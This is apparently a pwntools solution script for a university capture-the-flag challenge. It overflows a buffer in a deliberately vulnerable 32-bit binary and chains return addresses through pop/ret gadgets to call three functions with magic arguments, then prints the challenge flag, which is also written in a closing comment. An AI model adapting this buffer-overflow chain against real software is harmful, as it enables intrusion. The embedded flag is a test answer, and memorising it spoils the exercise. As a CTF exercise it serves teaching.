from pwn import *
import struct

BINARY = ['./chall']
IP, PORT = 'ctf99x.cs.ui.ac.id', 20003
LOCAL = False
DEBUG = False
if LOCAL:
    if DEBUG:
        p = gdb.debug(BINARY, '''
        b *vuln+48
        b *f1+22
        b *f2+37
        b *f3+131
        b *f3+154
        ''')
    else:
        p = process(BINARY)
else:
    p = remote(IP, PORT)
e = ELF('chall')
f1 = p32(e.symbols["f1"])
f1_arg = p32(0xDEADBEEF)

f2 = p32(e.symbols["f2"])
f2_arg = p32(0xBAAAAAAD)

f3 = p32(e.symbols["f3"])
f3_arg1 = p32(0xDEADBAAD)
f3_arg2 = p32(0xDEEEAAAD)

popret = p32(0x08048604)     # got from ropper --file chall --search pop
poppopret = p32(0x0804887a)  # got from ropper --file chall --search pop

dummy = b'A' * (24 + 12)
payload = dummy
payload += f1 + popret + f1_arg
payload += f2 + popret + f2_arg
payload += f3 + poppopret + f3_arg1 + f3_arg2
p.sendline(payload)

if LOCAL:
    sleep(2)
    print(p.recv().decode())
    pause()
else:
    print(p.recvall().decode())  # CSCE604258{rOp_a1N7_5o_H@rD_rIGh7}